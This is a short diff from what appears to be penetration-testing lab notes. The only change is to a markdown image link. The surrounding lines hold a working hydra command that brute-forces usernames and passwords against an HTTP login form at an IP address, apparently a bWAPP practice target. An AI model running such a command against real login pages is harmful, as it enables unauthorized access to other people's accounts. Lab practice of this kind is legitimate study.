@@ -327,7 +327,7 @@ echo "bug" >> pws
 hydra -L users -P pws 192.210.201.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
 ```
 
-![image-20230505005851326](.gitbook/assets/image-20230505005851326.png)
+![](.gitbook/assets/image-20230505005851326.png)
 
 ------
 
